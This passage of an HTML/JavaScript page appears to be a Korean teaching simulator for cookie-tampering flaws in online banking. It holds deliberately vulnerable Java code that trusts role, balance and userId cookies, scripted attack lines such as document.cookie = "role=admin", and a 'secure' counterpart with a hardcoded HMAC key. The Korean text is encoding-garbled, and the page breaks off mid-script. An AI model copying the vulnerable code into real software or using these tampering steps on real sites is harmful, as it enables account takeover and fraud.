<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ê¸ˆìœµê¶Œ ì¿ í‚¤ ë³€ì¡° ì·¨ì•½ì  ì‹œë®¬ë ˆì´í„°</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
        body { font-family: 'Noto Sans KR', sans-serif; }
        .code-font { font-family: 'Courier New', monospace; }
    </style>
</head>
<body class="bg-gray-100 p-4">

    <!-- í‰ê°€ê¸°ì¤€ ë°°ë„ˆ -->
    <div class="max-w-7xl mx-auto mb-4">
        <div class="bg-red-600 text-white p-4 rounded-lg shadow-lg">
            <div class="flex items-center gap-3">
                <i class="fas fa-clipboard-check text-2xl"></i>
                <div>
                    <h1 class="font-bold text-lg">ì „ìê¸ˆìœµê¸°ë°˜ì‹œì„¤ ë³´ì•ˆ ì·¨ì•½ì  í‰ê°€ê¸°ì¤€ - WEB-SER-047</h1>
                    <p class="text-sm">ì¿ í‚¤ ë³€ì¡° (CC) | ìœ„í—˜ë„: 3 (ì¤‘ê°„) | í†µì œêµ¬ë¶„: 5.2.5 ì¿ í‚¤ ë³´ì•ˆ</p>
                </div>
            </div>
        </div>
    </div>

    <!-- ë©”ì¸ ì»¨í…ì¸  -->
    <div class="max-w-7xl mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
            
            <!-- ì¢Œì¸¡: ì·¨ì•½í•œ ì‹œìŠ¤í…œ -->
            <div class="space-y-4">
                
                <!-- ì€í–‰ í—¤ë” -->
                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex items-center gap-3">
                        <i class="fas fa-building-columns text-2xl"></i>
                        <div>
                            <h2 class="text-xl font-bold">ê¸°ì—…ì€í–‰</h2>
                            <p class="text-sm">ì¸í„°ë„·ë±…í‚¹ ì‚¬ìš©ì ì¸ì¦</p>
                        </div>
                    </div>
                    <div class="mt-2 bg-red-500 px-3 py-1 rounded text-sm">
                        <i class="fas fa-exclamation-triangle"></i> ì·¨ì•½ì : ì¿ í‚¤ ê²€ì¦ ë¯¸í¡
                    </div>
                </div>

                <!-- ë¡œê·¸ì¸ í›„ í™”ë©´ -->
                <div class="bg-white p-5 rounded-lg shadow-lg">
                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
                        <i class="fas fa-user-circle text-blue-600"></i>
                        ì‚¬ìš©ì ì •ë³´
                    </h3>
                    
                    <div class="bg-blue-50 border-l-4 border-blue-500 p-3 mb-3">
                        <p class="text-sm mb-1"><strong>ì´ë¦„:</strong> <span id="userName">í™ê¸¸ë™</span></p>
                        <p class="text-sm mb-1"><strong>ë“±ê¸‰:</strong> <span id="userRole">ì¼ë°˜íšŒì›</span></p>
                        <p class="text-sm"><strong>ì”ì•¡:</strong> <span id="userBalance">1,234,000ì›</span></p>
                    </div>

                    <div class="bg-gray-100 p-3 rounded mb-3">
                        <p class="text-xs font-bold mb-2">ë¸Œë¼ìš°ì € ì¿ í‚¤:</p>
                        <div id="cookieDisplay" class="code-font text-xs bg-white p-2 rounded border">
                            <div>userId=<span class="text-blue-600">user001</span></div>
                            <div>role=<span class="text-blue-600">user</span></div>
                            <div>balance=<span class="text-blue-600">1234000</span></div>
                        </div>
                    </div>

                    <button onclick="resetCookie()" 
                            class="w-full bg-gray-500 hover:bg-gray-600 text-white py-2 rounded text-sm">
                        <i class="fas fa-redo"></i> ì¿ í‚¤ ì´ˆê¸°í™”
                    </button>
                </div>

                <!-- ì¿ í‚¤ ë³€ì¡° ë„êµ¬ -->
                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-wrench text-yellow-400"></i>
                        ì¿ í‚¤ ë³€ì¡° ë„êµ¬
                    </h3>
                    
                    <label class="block text-sm mb-2">role ì¿ í‚¤ ê°’:</label>
                    <select id="roleSelect" class="w-full p-2 rounded text-gray-900 mb-2">
                        <option value="user">user (ì¼ë°˜íšŒì›)</option>
                        <option value="vip">vip (VIPíšŒì›)</option>
                        <option value="admin">admin (ê´€ë¦¬ì)</option>
                    </select>

                    <label class="block text-sm mb-2">balance ì¿ í‚¤ ê°’:</label>
                    <input type="number" id="balanceInput" 
                           class="w-full p-2 rounded text-gray-900 mb-3" 
                           value="1234000">

                    <button onclick="modifyCookie()" 
                            class="w-full bg-red-600 hover:bg-red-700 text-white py-2 rounded">
                        <i class="fas fa-edit"></i> ì¿ í‚¤ ë³€ì¡° ì‹¤í–‰
                    </button>
                </div>

                <!-- ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ë²„íŠ¼ -->
                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-flask text-red-400"></i>
                        ê³µê²© ì‹œë‚˜ë¦¬ì˜¤
                    </h3>
                    <div class="space-y-2">
                        <button onclick="attackScenario(1)" 
                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-crown"></i> ì‹œë‚˜ë¦¬ì˜¤ 1: ê¶Œí•œ ìƒìŠ¹ (user â†’ admin)
                        </button>
                        <button onclick="attackScenario(2)" 
                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-money-bill-wave"></i> ì‹œë‚˜ë¦¬ì˜¤ 2: ì”ì•¡ ì¡°ì‘
                        </button>
                        <button onclick="attackScenario(3)" 
                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-id-card"></i> ì‹œë‚˜ë¦¬ì˜¤ 3: íƒ€ì¸ ID ì‚¬ì¹­
                        </button>
                        <button onclick="attackScenario(4)" 
                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-laptop-code"></i> ì‹œë‚˜ë¦¬ì˜¤ 4: XSSë¡œ ì¿ í‚¤ íƒˆì·¨
                        </button>
                    </div>
                </div>

                <!-- ì·¨ì•½í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-red-400">
                            <i class="fas fa-skull-crossbones"></i> ì·¨ì•½í•œ Java ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-red-600 px-2 py-1 rounded">ìœ„í—˜</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// âŒ ì¿ í‚¤ ê²€ì¦ ì—†ì´ ì‹ ë¢°</span>
@GetMapping("/mypage")
public String mypage(HttpServletRequest request) {
    
    <span class="text-red-400">// ì¿ í‚¤ ê°’ì„ ê·¸ëŒ€ë¡œ ì‹ ë¢°!</span>
    Cookie[] cookies = request.getCookies();
    String userId = getCookieValue(cookies, "userId");
    String role = getCookieValue(cookies, "role");
    int balance = Integer.parseInt(
        getCookieValue(cookies, "balance")
    );
    
    <span class="text-red-400">// ì„œë²„ ê²€ì¦ ì—†ì´ ê¶Œí•œ íŒë‹¨!</span>
    if ("admin".equals(role)) {
        return "adminPage";  // ê´€ë¦¬ì í˜ì´ì§€
    }
    
    <span class="text-red-400">// ì¿ í‚¤ì˜ ì”ì•¡ì„ ê·¸ëŒ€ë¡œ í‘œì‹œ!</span>
    model.addAttribute("balance", balance);
    
    return "mypage";
}

<span class="text-gray-500">// ì¿ í‚¤ ìƒì„± ì‹œ ì„œëª… ì—†ìŒ</span>
@PostMapping("/login")
public String login(String userId, String password) {
    
    User user = authenticate(userId, password);
    
    <span class="text-red-400">// í‰ë¬¸ ì¿ í‚¤ ìƒì„± (ì„œëª… ì—†ìŒ!)</span>
    Cookie userIdCookie = new Cookie("userId", userId);
    Cookie roleCookie = new Cookie("role", user.getRole());
    Cookie balanceCookie = new Cookie("balance", 
        String.valueOf(user.getBalance()));
    
    <span class="text-red-400">// HttpOnly ë¯¸ì„¤ì •!</span>
    response.addCookie(userIdCookie);
    response.addCookie(roleCookie);
    response.addCookie(balanceCookie);
    
    return "redirect:/mypage";
}</code></pre>
                </div>

            </div>

            <!-- ìš°ì¸¡: ê²°ê³¼ ë° ì•ˆì „í•œ ì½”ë“œ -->
            <div class="space-y-4">
                
                <!-- ê³µê²© ì‹¤í–‰ ê²°ê³¼ -->
                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
                        <h3 class="font-bold">
                            <i class="fas fa-terminal"></i> ê³µê²© ì‹¤í–‰ ê²°ê³¼
                        </h3>
                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
                            ëŒ€ê¸°ì¤‘
                        </span>
                    </div>
                    <div id="attackResult" class="p-5 min-h-[300px] bg-white">
                        <div class="text-center text-gray-400 py-10">
                            <i class="fas fa-cookie-bite text-5xl mb-3 opacity-30"></i>
                            <p class="text-sm">ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì„ íƒí•˜ì„¸ìš”</p>
                        </div>
                    </div>
                </div>

                <!-- ê³µê²© ë‹¨ê³„ -->
                <div id="attackStages" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
                        <i class="fas fa-list-ol"></i> ê³µê²© ì§„í–‰ ë‹¨ê³„
                    </h4>
                    <div id="stagesContent" class="text-sm text-red-700 space-y-1"></div>
                </div>

                <!-- í„°ë¯¸ë„ ì¶œë ¥ -->
                <div id="terminalBox" class="hidden bg-black text-green-400 p-4 rounded-lg shadow-lg">
                    <div class="font-bold mb-2 text-xs">
                        <i class="fas fa-terminal"></i> ATTACKER CONSOLE
                    </div>
                    <div id="terminalLines" class="code-font text-xs space-y-1 max-h-[200px] overflow-y-auto"></div>
                </div>

                <!-- ì•ˆì „í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-green-400">
                            <i class="fas fa-shield-halved"></i> ì•ˆì „í•œ Java ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-green-600 px-2 py-1 rounded">ê¶Œì¥</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto max-h-[350px]"><code><span class="text-green-400">// âœ… ì•ˆì „í•œ ì¿ í‚¤ ê´€ë¦¬</span>

<span class="text-gray-500">// 1. ì„œëª…ëœ ì¿ í‚¤ ìƒì„± (HMAC)</span>
@PostMapping("/login")
public String login(String userId, String password,
                   HttpServletResponse response) {
    
    User user = authenticate(userId, password);
    
    <span class="text-green-400">// ì„¸ì…˜ì— ì €ì¥ (ì¿ í‚¤ì— ë¯¼ê°ì •ë³´ X)</span>
    session.setAttribute("userId", userId);
    session.setAttribute("user", user);
    
    <span class="text-green-400">// ì„¸ì…˜ IDë§Œ ì¿ í‚¤ë¡œ ì „ì†¡</span>
    Cookie sessionCookie = new Cookie(
        "JSESSIONID", 
        session.getId()
    );
    
    <span class="text-green-400">// HttpOnly ì„¤ì • (XSS ë°©ì–´)</span>
    sessionCookie.setHttpOnly(true);
    
    <span class="text-green-400">// Secure ì„¤ì • (HTTPSë§Œ)</span>
    sessionCookie.setSecure(true);
    
    <span class="text-green-400">// SameSite ì„¤ì • (CSRF ë°©ì–´)</span>
    response.setHeader("Set-Cookie", 
        String.format(
            "JSESSIONID=%s; HttpOnly; Secure; SameSite=Strict",
            session.getId()
        )
    );
    
    return "redirect:/mypage";
}

<span class="text-gray-500">// 2. ì„œë²„ì—ì„œ ì„¸ì…˜ ê²€ì¦</span>
@GetMapping("/mypage")
public String mypage(HttpSession session, Model model) {
    
    <span class="text-green-400">// ì„¸ì…˜ì—ì„œ ì‚¬ìš©ì ì •ë³´ ì¡°íšŒ</span>
    User user = (User) session.getAttribute("user");
    
    if (user == null) {
        return "redirect:/login";
    }
    
    <span class="text-green-400">// DBì—ì„œ ì‹¤ì‹œê°„ ì •ë³´ ì¡°íšŒ</span>
    User currentUser = userService.findById(user.getId());
    
    <span class="text-green-400">// ì„œë²„ì—ì„œ ê¶Œí•œ í™•ì¸</span>
    if (currentUser.getRole().equals("ADMIN")) {
        model.addAttribute("isAdmin", true);
    }
    
    <span class="text-green-400">// DBì—ì„œ ì¡°íšŒí•œ ì”ì•¡ í‘œì‹œ</span>
    model.addAttribute("balance", currentUser.getBalance());
    
    return "mypage";
}

<span class="text-gray-500">// 3. ì¿ í‚¤ì— ë¯¼ê°ì •ë³´ í•„ìš” ì‹œ HMAC ì„œëª…</span>
public String createSignedCookie(String value) {
    
    <span class="text-green-400">// HMAC-SHA256ìœ¼ë¡œ ì„œëª… ìƒì„±</span>
    String secret = "your-secret-key-256bit";
    Mac sha256_HMAC = Mac.getInstance("HmacSHA256");
    SecretKeySpec secretKey = 
        new SecretKeySpec(secret.getBytes(), "HmacSHA256");
    sha256_HMAC.init(secretKey);
    
    byte[] hash = sha256_HMAC.doFinal(value.getBytes());
    String signature = Base64.getEncoder()
        .encodeToString(hash);
    
    <span class="text-green-400">// value + signature ê²°í•©</span>
    return value + "." + signature;
}

<span class="text-gray-500">// 4. ì„œëª… ê²€ì¦</span>
public boolean verifyCookie(String signedValue) {
    
    String[] parts = signedValue.split("\\.");
    if (parts.length != 2) {
        return false;
    }
    
    String value = parts[0];
    String receivedSignature = parts[1];
    
    <span class="text-green-400">// ì„œëª… ì¬ìƒì„±</span>
    String expectedSignedValue = createSignedCookie(value);
    String expectedSignature = 
        expectedSignedValue.split("\\.")[1];
    
    <span class="text-green-400">// ì„œëª… ì¼ì¹˜ í™•ì¸</span>
    return receivedSignature.equals(expectedSignature);
}

<span class="text-gray-500">// 5. Spring Boot ì¿ í‚¤ ë³´ì•ˆ ì„¤ì •</span>
@Bean
public ServletContextInitializer servletContextInit() {
    return ctx -> {
        SessionCookieConfig config = 
            ctx.getSessionCookieConfig();
        config.setHttpOnly(true);
        config.setSecure(true);
        config.setName("SESSIONID");
        config.setMaxAge(3600); // 1ì‹œê°„
        config.setAttribute("SameSite", "Strict");
    };
}</code></pre>
                </div>

                <!-- ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸ -->
                <div class="bg-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-list-check text-red-600"></i>
                        ì¿ í‚¤ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>HttpOnly:</strong> JavaScript ì ‘ê·¼ ì°¨ë‹¨</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>Secure:</strong> HTTPSì—ì„œë§Œ ì „ì†¡</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>SameSite:</strong> CSRF ê³µê²© ë°©ì–´</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ì„œëª…/ì•”í˜¸í™”:</strong> HMACìœ¼ë¡œ ë¬´ê²°ì„± ë³´ì¥</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ì„¸ì…˜ ì‚¬ìš©:</strong> ë¯¼ê°ì •ë³´ëŠ” ì„œë²„ì— ì €ì¥</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>ì„œë²„ ê²€ì¦:</strong> ì¿ í‚¤ ê°’ ì ˆëŒ€ ì‹ ë¢° ê¸ˆì§€</div>
                        </div>
                    </div>
                </div>

                <!-- í‰ê°€ íŒì • -->
                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
                        <i class="fas fa-gavel"></i> í‰ê°€ íŒì •
                    </h3>
                    <div class="text-xs space-y-1">
                        <div><strong>í‰ê°€í•­ëª©:</strong> WEB-SER-047 ì¿ í‚¤ ë³€ì¡°</div>
                        <div><strong>íŒì •:</strong> <span id="judgement" class="text-red-400">ì·¨ì•½</span></div>
                        <div><strong>ê·¼ê±°:</strong> <span id="evidence"></span></div>
                    </div>
                </div>

                <!-- í”¼í•´ ì‹œë‚˜ë¦¬ì˜¤ -->
                <div id="damageBox" class="hidden bg-red-700 text-white p-4 rounded-lg">
                    <h3 class="font-bold mb-3">
                        <i class="fas fa-fire"></i> ì‹¤ì œ í”¼í•´ ì‚¬ë¡€
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex gap-2">
                            <span class="font-bold">1.</span>
                            <div><strong>ê¶Œí•œ ìƒìŠ¹</strong><br>ì¼ë°˜ ì‚¬ìš©ì â†’ ê´€ë¦¬ì ê¶Œí•œ</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">2.</span>
                            <div><strong>ê°€ê²© ì¡°ì‘</strong><br>ìƒí’ˆ ê°€ê²© ì¿ í‚¤ ë³€ì¡°</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">3.</span>
                            <div><strong>ì‹ ì› ì‚¬ì¹­</strong><br>íƒ€ì¸ ID ì¿ í‚¤ë¡œ ë¡œê·¸ì¸</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">4.</span>
                            <div><strong>ë¬´ë£Œ ì´ìš©</strong><br>ê²°ì œ ìƒíƒœ ì¿ í‚¤ ì¡°ì‘</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        function resetCookie() {
            document.getElementById('userName').textContent = 'í™ê¸¸ë™';
            document.getElementById('userRole').textContent = 'ì¼ë°˜íšŒì›';
            document.getElementById('userBalance').textContent = '1,234,000ì›';
            
            document.getElementById('cookieDisplay').innerHTML = 
                '<div>userId=<span class="text-blue-600">user001</span></div>' +
                '<div>role=<span class="text-blue-600">user</span></div>' +
                '<div>balance=<span class="text-blue-600">1234000</span></div>';
            
            document.getElementById('roleSelect').value = 'user';
            document.getElementById('balanceInput').value = '1234000';
            
            document.getElementById('attackResult').innerHTML = 
                '<div class="text-center text-gray-400 py-10">' +
                '<i class="fas fa-cookie-bite text-5xl mb-3 opacity-30"></i>' +
                '<p class="text-sm">ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì„ íƒí•˜ì„¸ìš”</p></div>';
            
            document.getElementById('attackStages').classList.add('hidden');
            document.getElementById('terminalBox').classList.add('hidden');
            document.getElementById('judgementBox').classList.add('hidden');
            document.getElementById('damageBox').classList.add('hidden');
            document.getElementById('statusBadge').textContent = 'ëŒ€ê¸°ì¤‘';
            document.getElementById('statusBadge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
        }

        function modifyCookie() {
            var role = document.getElementById('roleSelect').value;
            var balance = document.getElementById('balanceInput').value;
            
            var roleText = role === 'admin' ? 'ê´€ë¦¬ì' : (role === 'vip' ? 'VIPíšŒì›' : 'ì¼ë°˜íšŒì›');
            document.getElementById('userRole').textContent = roleText;
            document.getElementById('userBalance').textContent = Number(balance).toLocaleString() + 'ì›';
            
            document.getElementById('cookieDisplay').innerHTML = 
                '<div>userId=<span class="text-blue-600">user001</span></div>' +
                '<div>role=<span class="text-red-600">' + role + '</span> <span class="text-red-500">â† ë³€ì¡°ë¨!</span></div>' +
                '<div>balance=<span class="text-red-600">' + balance + '</span> <span class="text-red-500">â† ë³€ì¡°ë¨!</span></div>';
        }

        async function attackScenario(type) {
            resetCookie();
            await sleep(200);
            
            var result = document.getElementById('attackResult');
            var badge = document.getElementById('statusBadge');
            
            document.getElementById('attackStages').classList.remove('hidden');
            document.getElementById('terminalBox').classList.remove('hidden');
            document.getElementById('judgementBox').classList.remove('hidden');
            document.getElementById('damageBox').classList.remove('hidden');
            document.getElementById('terminalLines').innerHTML = '';
            
            if (type === 1) {
                // ì‹œë‚˜ë¦¬ì˜¤ 1: ê¶Œí•œ ìƒìŠ¹
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. ê°œë°œì ë„êµ¬(F12) ì—´ê¸°</div>' +
                    '<div>2. Application â†’ Cookies í™•ì¸</div>' +
                    '<div>3. role=user â†’ role=admin ë³€ê²½</div>' +
                    '<div>4. í˜ì´ì§€ ìƒˆë¡œê³ ì¹¨ â†’ ê´€ë¦¬ì ê¶Œí•œ íšë“!</div>';
                
                addTerminalLine('> F12 ê°œë°œì ë„êµ¬ ì—´ê¸°');
                await sleep(500);
                addTerminalLine('> Application íƒ­ â†’ Cookies');
                await sleep(500);
                addTerminalLine('> í˜„ì¬ ì¿ í‚¤:');
                addTerminalLine('  role=user', 'text-gray-400');
                await sleep(800);
                addTerminalLine('> [!] ì¿ í‚¤ ë³€ì¡° ì‹œë„...', 'text-yellow-400');
                await sleep(500);
                
                document.getElementById('roleSelect').value = 'admin';
                modifyCookie();
                
                await sleep(500);
                addTerminalLine('> document.cookie = "role=admin"', 'text-red-400');
                await sleep(500);
                addTerminalLine('> í˜ì´ì§€ ìƒˆë¡œê³ ì¹¨...');
                await sleep(800);
                addTerminalLine('> [!] ê´€ë¦¬ì ê¶Œí•œ íšë“!', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ê¶Œí•œ ìƒìŠ¹ ì„±ê³µ</h4>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">ì¿ í‚¤ ë³€ì¡° ê³¼ì •:</p>' +
                    '<table class="w-full text-xs">' +
                    '<tr class="border-b bg-gray-50"><th class="text-left py-1">ë‹¨ê³„</th><th class="text-left py-1">Before</th><th class="text-left py-1">After</th></tr>' +
                    '<tr class="border-b"><td class="py-1">ì¿ í‚¤</td><td class="py-1 code-font">role=user</td><td class="py-1 code-font text-red-600">role=admin</td></tr>' +
                    '<tr><td class="py-1">ê¶Œí•œ</td><td class="py-1">ì¼ë°˜íšŒì›</td><td class="py-1 text-red-600">ê´€ë¦¬ì</td></tr>' +
                    '</table></div>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">íšë“í•œ ê´€ë¦¬ì ê¶Œí•œ:</p>' +
                    '<div class="space-y-1 text-xs">' +
                    '<div>âœ“ ëª¨ë“  ì‚¬ìš©ì ì •ë³´ ì¡°íšŒ</div>' +
                    '<div>âœ“ ê±°ë˜ ë‚´ì—­ ì—´ëŒ</div>' +
                    '<div>âœ“ ì‹œìŠ¤í…œ ì„¤ì • ë³€ê²½</div>' +
                    '<div>âœ“ ê³„ì¢Œ ì ê¸ˆ/í•´ì œ</div>' +
                    '</div></div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">âš ï¸ ë³´ì•ˆ ìœ„í˜‘</p>' +
                    '<p>ì„œë²„ ê²€ì¦ ì—†ì´ ì¿ í‚¤ë§Œìœ¼ë¡œ ê¶Œí•œ íŒë‹¨</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'ì¿ í‚¤ ê°’ ì„œë²„ ê²€ì¦ ë¯¸ìˆ˜í–‰';
                badge.textContent = 'ì·¨ì•½';
                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
                
            } else if (type === 2) {
                // ì‹œë‚˜ë¦¬ì˜¤ 2: ì”ì•¡ ì¡°ì‘
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. í˜„ì¬ ì”ì•¡ ì¿ í‚¤ í™•ì¸ (1,234,000ì›)</div>' +
                    '<div>2. balance ê°’ì„ 999,999,999ë¡œ ë³€ê²½</div>' +
                    '<div>3. ìƒˆë¡œê³ ì¹¨ í›„ ì¡°ì‘ëœ ì”ì•¡ í‘œì‹œ</div>' +
                    '<div>4. ì´ì²´ í•œë„ ìš°íšŒ ê°€ëŠ¥!</div>';
                
                addTerminalLine('> í˜„ì¬ ì”ì•¡ ì¿ í‚¤: 1234000');
                await sleep(500);
                addTerminalLine('> [!] ì”ì•¡ ì¡°ì‘ ì‹œë„...', 'text-yellow-400');
                await sleep(500);
                
                document.getElementById('balanceInput').value = '999999999';
                modifyCookie();
                
                await sleep(500);
                addTerminalLine('> document.cookie = "balance=999999999"', 'text-red-400');
                await sleep(500);
                addTerminalLine('> ìƒˆë¡œê³ ì¹¨...');
                await sleep(800);
                addTerminalLine('> [!] í‘œì‹œ ì”ì•¡: 999,999,999ì›', 'text-red-400');
                await sleep(500);
                addTerminalLine('> ì´ì²´ í•œë„ ì²´í¬ ìš°íšŒ ê°€ëŠ¥', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ì”ì•¡ í‘œì‹œ ì¡°ì‘</h4>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">ì¿ í‚¤ ë³€ì¡°:</p>' +
                    '<div class="bg-gray-100 p-2 rounded code-font text-xs mb-2">' +
                    '<div>Before: balance=<span class="text-gray-600">1234000</span></div>' +
                    '<div>After: balance=<span class="text-red-600">999999999</span></div>' +
                    '</div></div>' +
                    '<div class="bg-blue-50 border border-blue-300 p-3 rounded mb-3">' +
                    '<p class="text-sm font-bold mb-2">í‘œì‹œëœ ì”ì•¡:</p>' +
                    '<p class="text-2xl font-bold text-red-600">999,999,999ì›</p>' +
                    '<p class="text-xs text-gray-600 mt-1">ì‹¤ì œ DB ì”ì•¡: 1,234,000ì›</p>' +
                    '</div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">âš ï¸ ê°€ëŠ¥í•œ ê³µê²©</p>' +
                    '<p>â€¢ ì´ì²´ í•œë„ ì²´í¬ ìš°íšŒ</p>' +
                    '<p>â€¢ UI ê¸°ë°˜ ì œí•œ ë¬´ì‹œ</p>' +
                    '<p>â€¢ ì‚¬ìš©ì í˜¼ë€ ìœ ë„</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'ì¿ í‚¤ ì”ì•¡ ì‹ ë¢°';
                badge.textContent = 'ì·¨ì•½';
                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
                
            } else if (type === 3) {
                // ì‹œë‚˜ë¦¬ì˜¤ 3: íƒ€ì¸ ID ì‚¬ì¹­
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. ê³µê²© ëŒ€ìƒ ID íŒŒì•… (admin, vip001 ë“±)</div>' +
                    '<div>2. userId ì¿ í‚¤ë¥¼ íƒ€ì¸ IDë¡œ ë³€ê²½</div>' +
                    '<div>3. ì„œë²„ê°€ ì¿ í‚¤ë§Œ í™•ì¸</div>' +
                    '<div>4. íƒ€ì¸ ê³„ì¢Œ ì ‘ê·¼ ì„±ê³µ!</div>';
                
                addTerminalLine('> ê³µê²© ëŒ€ìƒ ID ë¦¬ìŠ¤íŠ¸:');
                await sleep(500);
                addTerminalLine('  - admin (ê´€ë¦¬ì)', 'text-yellow-400');
                addTerminalLine('  - vip001 (VIP ê³ ê°)', 'text-yellow-400');
                addTerminalLine('  - ceo (ì„ì›)', 'text-yellow-400');
                await sleep(800);
                addTerminalLine('> [!] userId ì¿ í‚¤ ë³€ì¡°...', 'text-red-400');
                await sleep(500);
                addTerminalLine('> document.cookie = "userId=admin"');
                await sleep(500);
                
                document.getElementById('cookieDisplay').innerHTML = 
                    '<div>userId=<span class="text-red-600">admin</span> <span class="text-red-500">â† ë³€ì¡°!</span></div>' +
                    '<div>role=<span class="text-blue-600">user</span></div>' +
                    '<div>balance=<span class="text-blue-600">1234000</span></div>';
                
                document.getElementById('userName').textContent = 'ê´€ë¦¬ì (ì‚¬ì¹­)';
                
                await sleep(800);
                addTerminalLine('> [!] ê´€ë¦¬ì ê³„ì • ì ‘ê·¼!', 'text-red-400');
                await sleep(500);
                addTerminalLine('> ë¯¼ê° ì •ë³´ ì¡°íšŒ ê°€ëŠ¥', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ì‹ ì› ì‚¬ì¹­ ì„±ê³µ</h4>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">ì‚¬ì¹­ ëŒ€ìƒ ê³„ì •:</p>' +
                    '<div class="bg-gray-100 p-2 rounded text-sm">' +
                    '<p><strong>ID:</strong> admin</p>' +
                    '<p><strong>ì´ë¦„:</strong> ì‹œìŠ¤í…œ ê´€ë¦¬ì</p>' +
                    '<p><strong>ê¶Œí•œ:</strong> ì „ì²´ ì‹œìŠ¤í…œ ì ‘ê·¼</p>' +
                    '</div></div>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">ì ‘ê·¼ ê°€ëŠ¥í•œ ì •ë³´:</p>' +
                    '<div class="space-y-1 text-xs">' +
                    '<div>âœ“ ì „ì²´ ê³ ê° ëª©ë¡</div>' +
                    '<div>âœ“ ê±°ë˜ ë‚´ì—­ (125,847ê±´)</div>' +
